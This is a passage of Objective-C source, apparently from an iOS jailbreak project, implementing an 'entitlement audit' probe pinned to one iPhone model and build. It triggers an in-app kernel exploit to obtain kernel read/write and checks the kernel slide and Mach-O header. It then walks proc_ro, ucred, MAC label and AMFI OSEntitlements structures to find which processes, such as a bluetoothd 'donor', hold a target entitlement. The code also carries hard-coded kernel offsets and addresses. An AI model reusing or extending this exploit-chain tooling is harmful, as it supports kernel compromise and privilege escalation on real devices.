     * kernel branch we cannot read offline (in-repo tree is 12377.1.9, the
     * phone runs 12377.2.8): if they do not hold, the chain stops before the
     * DER address is ever aimed at. */
    CNDPhysicalEntitlementAuditTrail(report, reportPath, entry,
        @"osentitlements-ro",
        scan->amfiSlotValue + CND_ENT_AUDIT_OSENTITLEMENTS_RO_OFFSET);
    if (!CNDPhysicalEntitlementAuditChainReadU64(api,
            scan->amfiSlotValue + CND_ENT_AUDIT_OSENTITLEMENTS_RO_OFFSET,
            &scan->roObject, scan)) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "ro-read");
        return false;
    }
    if (!CNDPhysicalEntitlementAuditKernelObject(scan->roObject) ||
        !CNDPhysicalEntitlementAuditChainReadU64(api, scan->roObject +
            CND_ENT_AUDIT_OSENTITLEMENTS_OWNER_OFFSET, &scan->roOwner, scan) ||
        !CNDPhysicalEntitlementAuditChainReadU64(api, scan->roObject +
            CND_ENT_AUDIT_OSENTITLEMENTS_CONTEXT_OFFSET, &scan->roContext,
            scan)) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "ro-read");
        return false;
    }
    scan->roOwnerCheck = scan->roOwner == scan->amfiSlotValue;
    scan->roContextCheck = scan->roContext == scan->roObject + 0x8;
    entry[@"roObject"] = CNDPhysicalEntitlementAuditHex(scan->roObject);
    entry[@"roOwner"] = CNDPhysicalEntitlementAuditHex(scan->roOwner);
    entry[@"roContext"] = CNDPhysicalEntitlementAuditHex(scan->roContext);
    entry[@"roOwnerCheck"] = @(scan->roOwnerCheck);
    entry[@"roContextCheck"] = @(scan->roContextCheck);
    if (!scan->roOwnerCheck || !scan->roContextCheck) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            scan->roOwnerCheck ? "ro-context-mismatch" : "ro-owner-mismatch");
        return false;
    }

    /* Derivation-backed corroboration, taken before the range gate so it is
     * recorded even when that gate refuses: 0xfffffff00977e43c writes the
     * decoded item's 0x100/0x101 type/flag word at ro+0x30. */
    uint64_t derTypeWord = 0;
    if (CNDPhysicalEntitlementAuditChainReadU64(api, scan->roObject +
            CND_ENT_AUDIT_OSENTITLEMENTS_DER_TYPE_OFFSET, &derTypeWord, scan)) {
        entry[@"derItemTypeWord"] = CNDPhysicalEntitlementAuditHex(derTypeWord);
        entry[@"derItemTypeWordExpected"] = @(
            (derTypeWord & ~UINT64_C(0x1)) ==
            CND_ENT_AUDIT_DER_ITEM_TYPE_BASE);
    }

    /* hop 6: the DER range, bounded before a single byte is read. */
    CNDPhysicalEntitlementAuditTrail(report, reportPath, entry, @"der-range",
        scan->roObject + CND_ENT_AUDIT_OSENTITLEMENTS_DER_START_OFFSET);
    if (!CNDPhysicalEntitlementAuditChainReadU64(api, scan->roObject +
            CND_ENT_AUDIT_OSENTITLEMENTS_DER_START_OFFSET, &scan->derStart,
            scan) ||
        !CNDPhysicalEntitlementAuditChainReadU64(api, scan->roObject +
            CND_ENT_AUDIT_OSENTITLEMENTS_DER_END_OFFSET, &scan->derEnd, scan)) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "der-range-read");
        return false;
    }
    entry[@"derStart"] = CNDPhysicalEntitlementAuditHex(scan->derStart);
    entry[@"derEnd"] = CNDPhysicalEntitlementAuditHex(scan->derEnd);
    /* A DER range is a byte range: both ends must be in band, in order, and
     * bounded - but neither is required to be 8-aligned.  What proves the
     * range readable is the streamed read below, not an alignment test. */
    if (!CNDPhysicalEntitlementAuditObjectBand(scan->derStart) ||
        !CNDPhysicalEntitlementAuditObjectBand(scan->derEnd) ||
        scan->derEnd <= scan->derStart ||
        scan->derEnd - scan->derStart > CND_ENT_AUDIT_DER_CAP) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "der-range-invalid");
        return false;
    }
    scan->derLength = scan->derEnd - scan->derStart;

    /* hop 7: the blob itself. */
    CNDPhysicalEntitlementAuditReadDER(api, target, report, reportPath, entry,
        needle, stem);
    return true;
}

static void CNDPhysicalEntitlementAuditFillTargetReport(
    NSMutableDictionary<NSString *, id> *entry,
    const CNDPhysicalEntitlementAuditTarget *target)
{
    NSMutableArray<NSString *> *samples = [NSMutableArray array];
    for (uint32_t slot = 0; slot < target->scan.sampleCount; slot++) {
        [samples addObject:[NSString stringWithUTF8String:
            target->scan.samples[slot]] ?: @""];
    }
    entry[@"labelReadable"] = @(target->labelReadable);
    entry[@"amfiObject"] = CNDPhysicalEntitlementAuditHex(target->amfiObject);
    entry[@"sandboxObject"] =
        CNDPhysicalEntitlementAuditHex(target->sandboxObject);
    entry[@"entitlementFound"] = @(target->scan.found);
    entry[@"entitlementStemFound"] = @(target->scan.stemFound);
    NSString *matched = [NSString stringWithUTF8String:target->scan.matched];
    entry[@"entitlementMatched"] = matched ?: @"";
    entry[@"scanReads"] = @(target->scan.reads);
    entry[@"scanTruncated"] = @(target->scan.truncated);
    entry[@"chainAborted"] = @(target->scan.aborted);
    entry[@"chainComplete"] =
        @(!target->scan.aborted && !target->scan.truncated);
    entry[@"chainStage"] = target->scan.aborted ? @"aborted" : @"complete";
    /* Typed chain evidence: every hop value, so a wrong offset/decode is
     * diagnosable from the report instead of from another device run. */
    entry[@"procRO"] = CNDPhysicalEntitlementAuditHex(target->scan.procRO);
    entry[@"ucred"] = CNDPhysicalEntitlementAuditHex(target->scan.ucred);
    entry[@"labelMatchesKutils"] = @(target->scan.labelMatchesKutils);
    entry[@"amfiSlotValue"] =
        CNDPhysicalEntitlementAuditHex(target->scan.amfiSlotValue);
    entry[@"roObject"] = CNDPhysicalEntitlementAuditHex(target->scan.roObject);
    entry[@"roOwnerCheck"] = @(target->scan.roOwnerCheck);
    entry[@"roContextCheck"] = @(target->scan.roContextCheck);
    entry[@"derStart"] = CNDPhysicalEntitlementAuditHex(target->scan.derStart);
    entry[@"derEnd"] = CNDPhysicalEntitlementAuditHex(target->scan.derEnd);
    entry[@"derLength"] = @(target->scan.derLength);
    entry[@"derBytesRead"] = @(target->scan.derBytesRead);
    entry[@"derFirstByte"] = @(target->scan.derFirstByte);
    entry[@"derKeyOffset"] = target->scan.derKeyOffset == UINT64_MAX
        ? @(-1) : @(target->scan.derKeyOffset);
    entry[@"entitlementValueHex"] = CNDPhysicalEntitlementAuditHexBytes(
        target->scan.entitlementValue, target->scan.entitlementValueLength);
    entry[@"sampleStrings"] = samples;
    if (target->labelReadable) {
        entry[@"labelBytes"] = CNDPhysicalEntitlementAuditHexBytes(
            target->labelBytes, sizeof(target->labelBytes));
    }
}

static NSDictionary<NSString *, id> *CNDPhysicalEntitlementAuditRunOnce(void)
{
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *reportPath = [directory stringByAppendingPathComponent:
        @"CNDPhysicalEntitlementAuditProbe.json"];
    NSMutableDictionary<NSString *, id> *report =
        [@{
            @"schema": @"com.zeroxjf.cyanide.physical-entitlement-audit",
            @"schemaVersion": @2,
            @"productType":
                CNDPhysicalEntitlementAuditSysctlString("hw.machine"),
            @"productBuildVersion":
                CNDPhysicalEntitlementAuditSysctlString("kern.osversion"),
            @"operation": @"read-only-entitlement-audit",
            @"requiredEntitlement": [NSString stringWithUTF8String:
                CNDPhysicalEntitlementAuditRequiredEntitlement] ?: @"",
            @"donorProcess": @"bluetoothd",
            @"kernelReadUsed": @YES,
            @"kernelWriteUsed": @NO,
            @"kernelCallUsed": @NO,
            @"providerUsed": @NO,
            @"labelBorrowed": @NO,
            @"krwSource": @"app kexploit (kreadbuf/kread64)",
            @"baseSource": @"g_kernel_base / g_kernel_slide",
            @"auditedProcesses": @[],
            @"reportPath": reportPath,
            @"state": @"starting",
        } mutableCopy];
    CNDPhysicalEntitlementAuditPersist(report, reportPath, nil, nil);

    NSString *product = report[@"productType"];
    NSString *build = report[@"productBuildVersion"];
    NSLog(@"[CND_ENT_AUDIT] start product=%@ build=%@ report=%@",
        product, build, reportPath);
    if (![product isEqualToString:
            @CND_PHYSICAL_ENTITLEMENT_AUDIT_EXPECTED_PRODUCT] ||
        ![build isEqualToString:
            @CND_PHYSICAL_ENTITLEMENT_AUDIT_EXPECTED_BUILD]) {
        CNDPhysicalEntitlementAuditPersist(report, reportPath, @"result",
            @"refused-unsupported-device");
        return report;
    }

    CNDPhysicalEntitlementAuditKernelAPI kernel = {0};
    if (!CNDPhysicalEntitlementAuditResolveKernelAPI(&kernel)) {
        CNDPhysicalEntitlementAuditPersist(report, reportPath, @"result",
            @"refused-api-unavailable");
        return report;
    }

    /* The offsets the chain reads are the ones offsets.m publishes, and nothing
     * has published them before the exploit runs: offsets_init() is called from
     * inside kexploit (kexploit_opa334.m:3121) and from the persistence path
     * (persistence.m:640), not at process start.  A headless launch therefore
     * sees zeroes here and this preflight refused on every fresh process
     * (device run 2026-10-18, result `refused-label-slot-mismatch` with both
     * slot offsets 0) - and it would have left off_proc_p_proc_ro,
     * off_proc_ro_p_ucred and off_ucred_cr_label at 0 for the chain too.
     * offsets_init() itself touches no kernel state: it switches on the
     * userland OS version and hw.cpufamily.  Calling it here is what makes the
     * check meaningful rather than tautological, and it still runs before the
     * exploit is asked for anything. */
    if (*kernel.amfiSlotOffset == 0 || *kernel.sandboxSlotOffset == 0 ||
        *kernel.procPProcROOffset == 0 || *kernel.procROPUcredOffset == 0 ||
        *kernel.ucredLabelOffset == 0) {
        CNDPhysicalEntitlementAuditPersist(report, reportPath, @"state",
            @"initializing-offsets");
        kernel.offsetsInit();
        report[@"offsetsInitCalled"] = @YES;
    } else {
        report[@"offsetsInitCalled"] = @NO;
    }

    report[@"amfiSlotOffset"] = @(*kernel.amfiSlotOffset);
    report[@"sandboxSlotOffset"] = @(*kernel.sandboxSlotOffset);
    report[@"procPProcROOffset"] = @(*kernel.procPProcROOffset);
    report[@"procROPUcredOffset"] = @(*kernel.procROPUcredOffset);
    report[@"ucredLabelOffset"] = @(*kernel.ucredLabelOffset);
    if (*kernel.amfiSlotOffset !=
            CNDPhysicalEntitlementAuditAMFISlotOffset ||
        *kernel.sandboxSlotOffset !=
            CNDPhysicalEntitlementAuditSandboxSlotOffset) {
        CNDPhysicalEntitlementAuditPersist(report, reportPath, @"result",
            @"refused-label-slot-mismatch");
        return report;
    }

    bool initiallyReady = kernel.krwReady();
    report[@"krwInitiallyReady"] = @(initiallyReady);
    bool acquired = false;
    if (!initiallyReady) {
        CNDPhysicalEntitlementAuditPersist(report, reportPath, @"state",
            @"acquiring-physical-krw");
        report[@"kexploitResult"] = @(kernel.kexploit());
        acquired = true;
    }
    bool ready = kernel.krwReady();
    report[@"krwValidated"] = @(ready);
    if (!ready) {
        CNDPhysicalEntitlementAuditPersist(report, reportPath, @"result",
            @"refused-krw-not-ready");
        return report;
    }

    uint64_t kernelBase = *kernel.kernelBase;
    uint64_t slide = *kernel.kernelSlide;
    report[@"kernelBase"] = CNDPhysicalEntitlementAuditHex(kernelBase);
    report[@"kernelSlide"] = CNDPhysicalEntitlementAuditHex(slide);
    bool baseMatches = kernelBase ==
        CNDPhysicalEntitlementAuditStaticKernelBase + slide;
    report[@"kernelBaseMatchesContainer"] = @(baseMatches);
    if (!baseMatches || slide > CND_PHYSICAL_ENTITLEMENT_AUDIT_SLIDE_MAX ||
        (slide & UINT64_C(0x3fff)) != 0) {
        CNDPhysicalEntitlementAuditPersist(report, reportPath, @"result",
            @"refused-base-mismatch");
        if (acquired) {
            report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        }
        return report;
    }

    /* Confirm the base really is the pinned image before trusting reads of it. */
    struct mach_header_64 header = {0};
    bool headerRead = CNDPhysicalEntitlementAuditReadBytes(
        &kernel, kernelBase, &header, sizeof(header));
    report[@"kernelHeaderMagic"] =
        CNDPhysicalEntitlementAuditHex(header.magic);
    report[@"kernelHeaderFiletype"] = @(header.filetype);
    if (!headerRead || header.magic != MH_MAGIC_64 ||
        header.filetype != MH_FILESET) {
        CNDPhysicalEntitlementAuditPersist(report, reportPath, @"result",
            @"refused-kernel-header");
        if (acquired) {
            report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        }
        return report;
    }

    const char *needle = CNDPhysicalEntitlementAuditRequiredEntitlement;
    CNDPhysicalEntitlementAuditPersist(report, reportPath, @"state",
        @"auditing");
    NSMutableArray<NSDictionary<NSString *, id> *> *entries =
        [NSMutableArray array];
    NSMutableArray<NSString *> *holders = [NSMutableArray array];
    NSMutableArray<NSString *> *stemHolders = [NSMutableArray array];
    BOOL donorHasEntitlement = NO;
    NSUInteger resolved = 0;
    NSUInteger abortedChains = 0;
    NSUInteger verdicts = 0;

    for (size_t index = 0;
         index < sizeof(CNDPhysicalEntitlementAuditCandidates) /
             sizeof(CNDPhysicalEntitlementAuditCandidates[0]);
         index++) {
        CNDPhysicalEntitlementAuditTarget target = {0};
        target.name = CNDPhysicalEntitlementAuditCandidates[index];
        target.scan.derKeyOffset = UINT64_MAX;
        uint64_t proc = kernel.procFindByName(target.name);
        target.proc = proc;
        if (!CNDPhysicalEntitlementAuditKernelObject(proc)) {
            [entries addObject:@{
                @"name": [NSString stringWithUTF8String:target.name] ?: @"",
                @"proc": CNDPhysicalEntitlementAuditHex(proc),
                @"labelReadable": @NO,
                @"entitlementFound": @NO,
                @"notRunning": @YES,
            }];
            continue;
        }
        resolved++;
        target.label = kernel.procGetCredLabel(proc);
        if (!CNDPhysicalEntitlementAuditKernelObject(target.label)) {
            [entries addObject:@{
                @"name": [NSString stringWithUTF8String:target.name] ?: @"",
                @"proc": CNDPhysicalEntitlementAuditHex(proc),
                @"label": CNDPhysicalEntitlementAuditHex(target.label),
                @"labelReadable": @NO,
                @"entitlementFound": @NO,
                @"chainState": @"label-not-object",
            }];
            continue;
        }

        /* The entry exists and is persisted before the first read, and every
         * chain step updates it afterwards, so a faulting run still leaves the
         * address that faulted in the report. */
        NSMutableDictionary<NSString *, id> *entry = [@{
            @"name": [NSString stringWithUTF8String:target.name] ?: @"",
            @"proc": CNDPhysicalEntitlementAuditHex(proc),
            @"label": CNDPhysicalEntitlementAuditHex(target.label),
            @"chainState": @"starting",
        } mutableCopy];
        [entries addObject:entry];
        report[@"auditedProcesses"] = entries;

        /* The label window is the one window read left, and it is safe by
         * construction: a MAC label carries l_perpolicy[MAC_MAX_SLOTS], so 32
         * bytes cannot cross its element boundary.  It is also device-proven
         * (labelReadable=true on every earlier run). */
        CNDPhysicalEntitlementAuditTrail(report, reportPath, entry,
            @"label-window", target.label);
        target.labelReadable = CNDPhysicalEntitlementAuditReadBytes(
            &kernel, target.label, target.labelBytes,
            sizeof(target.labelBytes));
        target.scan.reads++;
        if (!target.labelReadable) {
            CNDPhysicalEntitlementAuditAbort(&target.scan, report, reportPath,
                entry, "label-window-read");
            CNDPhysicalEntitlementAuditFillTargetReport(entry, &target);
            abortedChains++;
            report[@"auditedProcesses"] = entries;
            CNDPhysicalEntitlementAuditPersist(report, reportPath, nil, nil);
            continue;
        }

        /* The AMFI and sandbox slot values come straight out of that window, so
         * they cost no read at a new address.  (The slot offsets themselves were
         * already checked against the app's offsets module above.) */
        uint64_t amfiSlotValue = 0;
        uint64_t sandboxSlotValue = 0;
        memcpy(&amfiSlotValue, target.labelBytes +
            CNDPhysicalEntitlementAuditAMFISlotOffset, sizeof(amfiSlotValue));
        memcpy(&sandboxSlotValue, target.labelBytes +
            CNDPhysicalEntitlementAuditSandboxSlotOffset,
            sizeof(sandboxSlotValue));
        target.amfiObject = amfiSlotValue;
        target.sandboxObject = sandboxSlotValue;
        target.scan.amfiSlotValue = amfiSlotValue;
        entry[@"amfiSlotValue"] = CNDPhysicalEntitlementAuditHex(amfiSlotValue);
        entry[@"sandboxSlotValue"] =
            CNDPhysicalEntitlementAuditHex(sandboxSlotValue);

        CNDPhysicalEntitlementAuditReadChain(&kernel, &target, report,
            reportPath, entry, needle,
            CNDPhysicalEntitlementAuditRequiredEntitlementStem);
        CNDPhysicalEntitlementAuditFillTargetReport(entry, &target);
        if (target.scan.aborted) {
            abortedChains++;
        } else if (!target.scan.truncated) {
            verdicts++;
        }

        if (!target.scan.aborted && target.scan.found) {
            [holders addObject:[NSString stringWithUTF8String:target.name]
                ?: @""];
            if (strcmp(target.name, "bluetoothd") == 0) {
                donorHasEntitlement = YES;
            }
        } else if (!target.scan.aborted && target.scan.stemFound) {
            [stemHolders addObject:[NSString stringWithUTF8String:target.name]
                ?: @""];
        }
        NSString *chainState = entry[@"chainState"];
        NSString *amfiHex = CNDPhysicalEntitlementAuditHex(target.amfiObject);
        NSLog(@"[CND_ENT_AUDIT] %s chain=%s found=%d reads=%llu amfi=%s",
            target.name, chainState.UTF8String, target.scan.found ? 1 : 0,
            (unsigned long long)target.scan.reads, amfiHex.UTF8String);
        report[@"auditedProcesses"] = entries;
        CNDPhysicalEntitlementAuditPersist(report, reportPath, nil, nil);
    }

    if (resolved == 0) {
        report[@"auditedProcesses"] = entries;
        CNDPhysicalEntitlementAuditPersist(report, reportPath, @"result",
            @"refused-no-process-resolved");
        if (acquired) {
            report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        }
        return report;
    }

    report[@"auditedProcesses"] = entries;
    report[@"donorHasEntitlement"] = @(donorHasEntitlement);
    report[@"processesWithEntitlement"] = holders;
    report[@"processesWithEntitlementStem"] = stemHolders;
    report[@"processesResolved"] = @(resolved);
    report[@"chainType"] = @"typed-windowless-read";
    report[@"windowWalkUsed"] = @NO;
    report[@"readGranularityBytes"] = @(sizeof(uint64_t));
    report[@"derCapBytes"] = @(CND_ENT_AUDIT_DER_CAP);
    report[@"readBudgetPerCandidate"] = @(CND_ENT_AUDIT_READ_BUDGET);
    report[@"chainsAborted"] = @(abortedChains);
    report[@"verdictCount"] = @(verdicts);
    report[@"donorAuditVerdictReached"] = @(verdicts > 0);

    /* "The chain did not verify" is not "the donor lacks the entitlement".  If
     * no candidate produced a verdict, the outcome says so rather than letting
     * donorHasEntitlement=NO read as an answer. */
    CNDPhysicalEntitlementAuditPersist(report, reportPath, @"result",
        verdicts > 0 ? @"physical-krw-entitlement-audit-complete"
                     : @"physical-krw-entitlement-audit-aborted");

    if (acquired) {
        report[@"krwTerminalCleanupParked"] = @(kernel.krwCleanup());
        CNDPhysicalEntitlementAuditPersist(report, reportPath, nil, nil);
    } else {
        report[@"krwLeftOpenBecausePreexisting"] = @YES;
        CNDPhysicalEntitlementAuditPersist(report, reportPath, nil, nil);
    }
    return report;
}

BOOL CNDPhysicalEntitlementAuditProbeIsSupported(NSString **reasonOut)
{
    NSString *product =
        CNDPhysicalEntitlementAuditSysctlString("hw.machine");
    NSString *build =
        CNDPhysicalEntitlementAuditSysctlString("kern.osversion");
    BOOL supported =
        [product isEqualToString:
            @CND_PHYSICAL_ENTITLEMENT_AUDIT_EXPECTED_PRODUCT] &&
        [build isEqualToString:
            @CND_PHYSICAL_ENTITLEMENT_AUDIT_EXPECTED_BUILD];
    if (reasonOut != NULL) {
        *reasonOut = supported
            ? @"Exact iPhone17,2 / 23A341 target matched."
            : [NSString stringWithFormat:
                @"Requires iPhone17,2 / 23A341; observed %@ / %@.",
                product.length ? product : @"unknown",
                build.length ? build : @"unknown"];
    }
    return supported;
}

BOOL CNDPhysicalEntitlementAuditProbeIsRunning(void)
{
    return __sync_fetch_and_add(
        &gCNDPhysicalEntitlementAuditProbeRunning, 0) != 0;
}

void CNDPhysicalEntitlementAuditProbeRun(
    CNDPhysicalEntitlementAuditProbeCompletion completion)
{
    if (!__sync_bool_compare_and_swap(
            &gCNDPhysicalEntitlementAuditProbeRunning, 0, 1)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-already-running",
                @"message":
                    @"The physical entitlement audit probe is already running.",
            });
        });
        return;
    }
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary<NSString *, id> *report =
            CNDPhysicalEntitlementAuditRunOnce();
        __sync_lock_release(&gCNDPhysicalEntitlementAuditProbeRunning);
        /* RunOnce has returned from every path by now, so stamp the terminal
         * state on the report it built.  Without this a finished report keeps
         * carrying its last in-flight state ("initializing-offsets",
         * "acquiring-physical-krw", "auditing") and reads as unfinished.  The
         * object RunOnce returns is the mutable dictionary it persisted. */
        if ([report isKindOfClass:NSMutableDictionary.class]) {
            NSMutableDictionary<NSString *, id> *finished =
                (NSMutableDictionary<NSString *, id> *)report;
            CNDPhysicalEntitlementAuditPersist(finished,
                finished[@"reportPath"], @"state", @"finished");
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}
